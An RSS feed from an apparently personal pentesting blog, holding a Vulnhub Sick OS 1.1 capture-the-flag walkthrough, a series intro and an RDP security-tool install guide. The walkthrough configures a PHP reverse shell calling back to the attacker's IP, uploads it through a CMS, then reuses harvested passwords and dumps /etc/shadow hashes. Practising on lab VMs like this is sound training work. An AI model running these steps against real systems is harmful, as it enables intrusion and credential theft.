<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>AlternativeSec</title>
    <description>A small website blog for cyber sec and pentesting adventures. </description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Mon, 24 Apr 2017 21:41:14 +0100</pubDate>
    <lastBuildDate>Mon, 24 Apr 2017 21:41:14 +0100</lastBuildDate>
    <generator>Jekyll v3.3.1</generator>
    
      <item>
        <title>Vulnhub Sick OS 1.1</title>
        <description>&lt;p&gt;Sick OS is a Vulnerable VM which can be found on &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;Vulnhub&lt;/a&gt;. These VM’s are designed with software and or system flaws and therefore vulnerable by nature. The key to exploiting them is figuring out how to leverage what you find! These VM’s are great tools for educational purposes and improving ones skills AND they’re FREE!!! These machines also provide a safe and legal method of conducting penetration tests within a safe lab environment. This will be a full walk-through on compromising the host!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This guide is for educational purposes only! You should never attempt any of the techniques outlined in this post on live targets, unless you are the owner or have the consent of the owner and legal authority to do so i.e. a scope of work, which is a legally binding document. You have been warned ….&lt;/p&gt;

&lt;p&gt;Ok so with the serious stuff out of the way we can move on …&lt;/p&gt;

&lt;p&gt;If you want to follow along you can grab the Sick OS 1.1 VM from here &lt;a href=&quot;https://www.vulnhub.com/entry/sickos-11,132/&quot;&gt;SickOS&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;Vulnhub - Sick OS 1.1 VM

Name........: SickOs1.1
Date Release: 11 Dec 2015
Author......: D4rk
Series......: SickOs
Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
Tester(s)...: h1tch1
Twitter.....: https:twitter.com/D4rk36/

Type: Boot-to-Root VM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Host discovery&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ok first things first, we need to identify the host in my lab (the lab is sandboxed and IP ranges changed regularly). I used netdiscover for that:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;# netdiscover -r 192.168.1.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                

 20 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 1200                                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.94    08:00:27:ac:f3:c3      1      60  Cadmus Computer Systems                                                                                                                                                                                                                                 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok good so now we have our target IP: 192.168.1.94&lt;/p&gt;

&lt;p&gt;Port scan and service enumeration&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;:~# nmap -Pn -p- -sSV -A 192.168.1.94

Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-24 11:19 EST
Nmap scan report for SickOs.home (192.168.1.94)
Host is up (0.00084s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:GET
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
MAC Address: 08:00:27:AC:F3:C3 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.84 ms SickOs.home (192.168.1.94)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.07 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, our Nmap scan has identified that TCP Port 22 SSH and Port 3128 Squid proxy are open. Now we have starting point! You may have noticed from the Nmap scan that TCP Port 80 isn’t open and Port 8080 is closed. I did try them on the off chance but as suspect they returned nothing!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Squid proxy&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Starting with the Squid proxy http service, I accessed it via a web browser and got this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Browser-error.png&quot; alt=&quot;Browser&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also grabbed the HTTP Headers (just in case!):&lt;/p&gt;

&lt;p&gt;HTTP Header info:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohiglight&quot;&gt;:~# curl -LIN 192.168.1.94:3128
HTTP/1.0 400 Bad Request
Server: squid/3.1.19
Mime-Version: 1.0
Date: Thu, 24 Nov 2016 17:04:44 GMT
Content-Type: text/html
Content-Length: 3150
X-Squid-Error: ERR_INVALID_URL 0
Vary: Accept-Language
Content-Language: en
X-Cache: MISS from localhost
X-Cache-Lookup: NONE from localhost:3128
Via: 1.0 localhost (squid/3.1.19)
Connection: close
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This didn’t give us much, as expected! Now lets set up our browser to use the Squid proxy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/ConnectionSetting.png&quot; alt=&quot;Proxy Setup&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we have the proxy in place, it’s probably a good time to run Nikto and or Dirb (I ran both):&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Nikto&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now, I’d not used nikto to scan using a proxy before, so this was new to me! A quick google/man page read sorted out the finer details.&lt;/p&gt;

&lt;p&gt;I needed to make a change to the ‘/etc/nikto.conf’ file and add these lines:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;# Proxy settings -- still must be enabled by -userproxy
PROXYHOST=192.168.1.94
PROXYPORT=3128
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once the changes had been made and saved, it was time to set Nikto loose!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Nikto.png&quot; alt=&quot;Nikto&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dirb&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Using Dirb via the proxy was a similar process, though no config change was needed,  I just had to specify the target URL, add the ‘-p’ flag, then our target IP:Port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Dirb.png&quot; alt=&quot;Dirb&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, so know I have a decent idea of what’s going on with the web-server. Before I couldn’t get to any of the locations listed, can I get there through the web proxy? Now that the proxy is enabled, I opened up a browser again and entered the target IP:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Blehhh.png&quot; alt=&quot;Dirb&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we have a different response, winner! Now we’re gaining some traction!!!
So lets check the ‘/robots.txt’ file highlighted by Dirb.&lt;/p&gt;

&lt;p&gt;So the /robots.txt file reveals:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;User-agent: *
Disallow: /
Dissalow: /wolfcms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another clue … ‘/wolfcms’, the game is a foot, lets get investigating!!!&lt;/p&gt;

&lt;p&gt;By browsing to ‘192.168.1.94/wolfcms/’ we are greeted with a WolfCMS page (a quick google confirmed this was a content management system):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms.png&quot; alt=&quot;WolfCMS&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, there wasn’t an obvious login option on the WolfCMS page, time for our old faithful friend, Google! A quick google lead me to this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;&amp;lt;Target_URL&amp;gt;/wolfcms/?/admin/login
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms-login.png&quot; alt=&quot;Wolf Login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As soon as I clicked on the ‘Username’ field an auto complete box popped up with the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms-login-password.png&quot; alt=&quot;Wolf password&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was the first time I had any type of interaction with the ‘username’ input field, normally the browser ‘autocomplete’ feature is set client side i.e. me, rather than server side. Taking this as a sign from the ‘L33T’ gods, I entered the old faithful combo of ‘admin/admin’; however, this failed with the following error:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;The page isn't redirecting properly

Firefox has detected that the server is redirecting the request for this address in a way that will never complete.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hmmm … what’s going on here then!&lt;/p&gt;

&lt;p&gt;After a little online search, it seems that this may have something to do with cookies. A quick search led me to this…&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;On the redirect page press 'Alt + t' &amp;gt; Page info &amp;gt;  Security &amp;gt; View Coookies &amp;gt; Search &amp;lt;Target_IP&amp;gt; &amp;gt; 'Remove All' and close.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once I had done the above, I refreshed the browser. This took me back to the login screen. I Re-entered the ‘admin/admin’ combo and I was in! If you’re following along, you should be greeted with the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms-Admin.png&quot; alt=&quot;Wolf Admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now we have access to the web server as an administrator. Looking around the settings confirms this, and it also seems I have the option to add a user and upload files!! DING DING DING!!! So I added an additional user as a back up with the same privilege level as the Administrator user:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;Name: bob
Username: Hacker
Password: Hacker123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;NB: Cheese alert!! I was having a ‘L33t’ moment with the username/password combo … forgive me!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Ok, so a quick recap; we now have web access as the administrator to the target hosts CMS application and we have added a back up user for those ‘just incase’ scenarios. Though this is not the main objective, we need to root the host!&lt;/p&gt;

&lt;p&gt;After this I switched my attention to the file upload facility that I have access to as the user ‘administrator’!&lt;/p&gt;

&lt;p&gt;The web server runs php code with at least one php file present already (as seen below):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;%B%Y archive
&amp;lt;?php $archives = $this-&amp;gt;archive-&amp;gt;get(); ?&amp;gt;
&amp;lt;?php foreach ($archives as $archive): ?&amp;gt;
&amp;lt;div class=&quot;entry&quot;&amp;gt;
  &amp;lt;h3&amp;gt;&amp;lt;?php echo $archive-&amp;gt;link(); ?&amp;gt;&amp;lt;/h3&amp;gt;
  &amp;lt;p class=&quot;info&quot;&amp;gt;Posted by &amp;lt;?php echo $archive-&amp;gt;author(); ?&amp;gt; on &amp;lt;?php echo $archive-&amp;gt;date(); ?&amp;gt;
  &amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;?php endforeach; ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this in mind, now seems like a good time to thinking about upload a PHP-Reverse-Shell! Pentestmonkey springs to mind! A quick visit to his site &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;Pentestmonkey.net&lt;/a&gt; lets us nab a copy of his:&lt;/p&gt;

&lt;p&gt;I modified the code to suit our scenario.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;set_time_limit (0);
$VERSION = &quot;1.0&quot;;
$ip = '192.168.1.174';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As I now know from the Nikto/Dirb scans there are publicly accessible/browsable directories available on the host via the web browser. One of these dir’s is ‘/public/images’. This seems like a good location to upload our shell to. Through our Administrator console&lt;/p&gt;

&lt;p&gt;Selecting the ‘Files’ option:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Wolfcms-fileupload.png&quot; alt=&quot;Wolf Admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uploading the php-reverse-shell file to the ‘/public/images’ directory is successful.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploit time…&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Starting a netcat listener on my host allows me to catch the incoming connection from our reverse shell that I uploaded:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;nc -lvp 1234
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then by browsing to the reverse shell URL:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;http://192.168.1.94/wolfcms/public/images/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can now trigger our reverse php shell though this URL and have the server run the code that will initiate our reverse shell. This will then activate on our attacking host terminal where my netcat listener is waiting for incoming connections:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;root@Shadow:~# nc -l -v -p 1234
listening on [any] 1234 ...
connect to [192.168.1.174] from SickOs.home [192.168.1.94] 41618
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 15:29:06 up 31 min,  0 users,  load average: 0.01, 0.05, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ ls
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, so its a low privilege shell! We need to elevate!! Whilst here, I look around for anything that can help with that:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;Host info (/etc/os-release):

$ cat os-release
NAME=&quot;Ubuntu&quot;
VERSION=&quot;12.04.4 LTS, Precise Pangolin&quot;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&quot;Ubuntu precise (12.04.4 LTS)&quot;
VERSION_ID=&quot;12.04&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then I had a look at the ‘/etc/passwd’ file for other users:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;Note the ‘sickos’ user listed above.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I then decided to look in the ‘/var/www’ dir, to see if any of the files there have anything useful:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ cd ../var/www                       
$ ls
connect.py
index.php
robots.txt
wolfcms
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;‘wolfcms’ is directory, so I looked in there to:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ cd wolfcms
$ ls
CONTRIBUTING.md
README.md
composer.json
config.php
docs
favicon.ico
index.php
public
robots.txt
wolf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While having a look through the files in this dir the ‘config.php’ seemed like an obvious place to start for any hardcoded creds. Bingo!! The file contained some interesting details:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The config file has given me the root SQL login credentials for a mysql database ‘wolf’. My next step was to attempt to login into the mysql db from my current shell, this failed and I’m not sure why! I tried a few more time and it failed each time!&lt;/p&gt;

&lt;p&gt;Ok, so what else do we have! We discovered a user ‘sickos’, a db user ‘root’ and we have a password, maybe there’s some password reuse going on! I decided to try the ssh service with the usernames and password I had recovered in attempt to leverage the ssh service on the target host. The user name ‘sickOS’ got me a result:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/ssh.png&quot; alt=&quot;Wolf Admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the user confirmed as ‘sickos’ I checked if I had sudo privileges, using the same password ‘john@123’. This was accepted and I now have root privilege:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;sickos@SickOs:/$ sudo su
[sudo] password for sickos:
root@SickOs:/# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this now confirmed, time to get some info:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;--[Snip of shadow file]--
root@SickOs:/# cat /etc/shadow
root:$6$0QtWAOH/$6uGGYVCw2lccBlovXeH8dqH6ILcCRZw.OydoldEZVS3m7RxgdUoZLl3UbDId59KMTUuxkGG/ln0gbwWSO7kNp.:16775:0:99999:7:::
sickos:$6$x3xnQBfR$4WohiqaIzmpfk1duLLeJqA33zNhEQeuvPS4NiLLIxxOyNwz2dRMUbah.MZ0gSVMV4YNJC6meNpxa4YSrSJ75X.:16700:0:99999:7:::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;User hashes dumped.&lt;/p&gt;

&lt;p&gt;And saving the best for last ………&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/SickOS/Proof.png&quot; alt=&quot;Wolf Admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There we have it folks! We got through it all and completed the objective, root access and ultimately pwnd SickOS! This is just the way I ‘rooted’ SickOS, there are other ways of doing this and more info can be retrieved…&lt;/p&gt;

&lt;p&gt;I’d like to say a big thank you to &lt;a href=&quot;https://twitter.com/VulnHub&quot;&gt;@Vulnhub&lt;/a&gt; and &lt;a href=&quot;https:twitter.com/D4rk36/&quot;&gt;@D4rk36&lt;/a&gt; for providing the Sick OS series.&lt;/p&gt;

&lt;p&gt;Well thats it folks… You don’t have to go home, but you cant stay here!&lt;/p&gt;

&lt;p&gt;Thanks for reading!!&lt;/p&gt;
</description>
        <pubDate>Thu, 16 Feb 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub/2017/02/16/Sick-OS/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub/2017/02/16/Sick-OS/</guid>
        
        <category>2017</category>
        
        <category>Vulnhub</category>
        
        <category>walkthroughs</category>
        
        <category>Sick OS</category>
        
        <category>New</category>
        
        
        <category>Vulnhub</category>
        
      </item>
    
      <item>
        <title>Vulnhub Series</title>
        <description>&lt;p&gt;So when not working, doing the daily family things, studying, working out, eating, sleeping and trying to fit anything else into the day that needs done, I aim to try to have a crack at the &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub VM’s&lt;/a&gt;. The folks that put their time and effort in to constructing these scenarios truly deserve more credit, as they allow folks (such as myself) to practice, hone skills, but most importantly, continue to LEARN!! So from me to you, Thank you!!&lt;/p&gt;

&lt;p&gt;I’m by no means a seasoned pro, in fact, I rather prefer calling myself a perpetual student! I’m sure some of you may have opinions on my methods or how I do certain things. There may well be, and in fact, probably are easier ways of doing things than what I’ll cover in these write-ups. So please, stick with me!&lt;/p&gt;

&lt;p&gt;If there is anything you’d like to point out/suggest, feel free to get in touch and share the knowledge. At the end of the day this is how we progress; we learn by hard work and by knowledge being passed on …&lt;/p&gt;

&lt;p&gt;So with all of the above in mind, and in addition to the other types of blog content you’ll get the chance to read here at AlternativeSec, I’ll be doing a Vulnhub category, writing up the VM’s (I get the time to have a crack at) as I go along and hopefully pwn, on my way to Vulnhub &lt;a href=&quot;http://www.urbandictionary.com/define.php?term=Leet%20o'clock&quot;&gt;‘L33t o’clock’&lt;/a&gt; stardom!&lt;/p&gt;

&lt;p&gt;If you haven’t already done so, drop by &lt;a href=&quot;https://twitter.com/VulnHub&quot;&gt;Vulnhub’s Twitter&lt;/a&gt; and get upto date with what’s going on. Also don’t forget to drop a like or thank you to the creators of the VM’s you have a crack at!&lt;/p&gt;

&lt;p&gt;Until the next time!&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Feb 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub/2017/02/01/Vulnhub-Series/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub/2017/02/01/Vulnhub-Series/</guid>
        
        <category>2017</category>
        
        <category>Vulnhub</category>
        
        <category>walkthroughs</category>
        
        <category>Expect</category>
        
        <category>New</category>
        
        
        <category>Vulnhub</category>
        
      </item>
    
      <item>
        <title>RDP Sec Check Tool</title>
        <description>&lt;p&gt;Following on from my previous blog post on &lt;strong&gt;&lt;a href=&quot;https://www.alternativesec.xyz/pentesting/2017/01/02/NLA-How-to/&quot;&gt;NLA&lt;/a&gt;&lt;/strong&gt;, a tool to help with RDP enumeration has been suggested to me to explore. The tools name is ‘rdp-sec-check’ by Portcullis Labs.&lt;/p&gt;

&lt;p&gt;Having surfed over to the Protcullis website to check out this tool I found a handy introduction to it. As expected it covers basically what the tool is and how it goes about its business. Obviously the name gives it away, ‘rdp-sec-check’, it’s another tool for checking the RDP security configuration of a target host.
Some folks might already be saying, big deal, tools such as Nmap and its NSE script for checking RDP:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;nmap -p 3389 --script rdp-enum-encryption &amp;lt;Target-host&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and the likes of &lt;a href=&quot;http://www.xrdp.org&quot;&gt;XRDP&lt;/a&gt; etc can do this already and your initial thoughts you would be right; however, the Portcullis rdp-sec-check tool is not intended to replace the likes of this Nmap script or any type of manual verification, on the contrary, it is there to augment the testing of this service by providing additional context and continuity of any testing that is already underway or that has taken place.&lt;/p&gt;

&lt;p&gt;Ok so here’s what Portcullis have to say about ‘rdp-sec-check’:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;rdp-sec-check is a Perl script to enumerate security settings of an RDP Service (AKA Terminal Services)

It does not require authentication, only network connectivity to TCP port 3389.
It can determine many (though not quite all) of the security settings from the RDP-Tcp Properties | General tab:
•	Check which security layers are supported by the service: Standard RDP Security, TLSv1.0, CredSSP.
•	For Standard RDP Security it detects the level of encryption supported: 40-bit, 56-bit, 128-bit, FIPS.
The following potential security issues are flagged if present:
•	The service supports Standard RDP Security – this is known to be vulnerable to an active “Man-In-The-Middle” attack.
•	The service supports weak encryption (40-bit or 56-bit).
•	The service does not mandate Network Level Authentication (NLA) - NLA can help to prevent certain types of Denial of Service attack.
•	The service supports FIPS encryption but doesn’t mandate it – may only be interesting for jurisdictions where FIPS is required.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now we know about the tool and what it does, I guess it’s time to install it!&lt;/p&gt;

&lt;p&gt;Not so fast for me … It seems the tool has a dependency to ensure it works correctly. The Portcullis info mentions CPAN and BER module. What’s CPAN and what’s an Encoding::BER when you’re at home???&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CPAN&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Before we can jump straight into using the tool, it seems we need to update/install an encoding module from the Comprehensive Perl Archive Network or CPAN as its commonly known! Now, if like me, you’re not to sure what CPAN is here’s a bite sized summary:&lt;/p&gt;

&lt;p&gt;Cpan is a repository of more that 250,000 software modules and accompanying documentation for Perl.&lt;/p&gt;

&lt;p&gt;The CPAN’s main purpose is to help programmers locate modules and programs not included in the Perl standard distribution with the majority of CPAN being free and open source software.&lt;/p&gt;

&lt;p&gt;More information can be found here &lt;strong&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/CPAN&quot;&gt;CPAN-WIKI&lt;/a&gt;&lt;/strong&gt; and here &lt;strong&gt;&lt;a href=&quot;http://search.cpan.org/faq.html&quot;&gt;CPAN-Website&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Encoding::BER module&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So, what is this ‘Encoding::BER’ module you speak of? Ok, I’ll admit I had no idea what this was and other than what the information I’ve read over tells me, I still don’t know much more than this:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;“The Encoding::BER - Perl module is used for encoding/decoding data using ASN.1 Basic Encoding Rules (BER)”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So, basically to me (and possibly you), it allows us to take advantage of this perl module to encode/decode data. Plus, it makes the Portcullis rdp-sec-check tool work (which is really the main bit we care about at present!).&lt;/p&gt;

&lt;p&gt;More information on the CPAN Encoding::BER module can be found here &lt;strong&gt;&lt;a href=&quot;http://search.cpan.org/~jaw/Encoding-BER-1.02/lib/Encoding/BER.pm&quot;&gt;CPAN-Encoding::BER&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installing the module&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So not having worked much with Perl before (don’t hate me) or the CPAN repo, I’ll admit I was like ‘erm, I’m not really 100% on what or how to do this!’ So breaking it down lets sort the Cpan dependancy first. Fire up a terminal (depending on OS, you might need to sudo this command and the screen output may vary. I‘ve installed on both, a Kali rolling instance and Ubuntu 16.04 Lts and the process/screen output differed slightly) and type:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ sudo cpan
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This new line should appear:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;cpan[1]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After ‘cpan[1]&amp;gt;’ type ‘install Encoding::BER:’ like so:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;cpan[1]&amp;gt; install Encoding::BER
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will now begin to check and run through the install of the module. As mentioned above depending on system and whether you have carried out cpan updates before, the screen output and time to install may vary, though in the end you should see something along these lines:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;/usr/bin/make install  -- OK

cpan[2]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OR&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;DONE
cpan[2]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once we see this and assuming no errors popped up during the install, all we need to do now is exit the cpan service. This can be achieved by typing ‘exit’ after ‘cpan[2]&amp;gt;’ like so:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;cpan[2]&amp;gt;exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You should be greeted with the following output or similar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;cpan[2]&amp;gt; exit
Lockfile removed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now thats the CPAN dependency is taken care of, we can now move on to getting the rdp-sec-check tool. At the time of writing this blog post 26th January 2017, the most recent version of the tool is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;rdp-sec-check-0.9.tgz
&lt;/code&gt;&lt;/pre&gt;

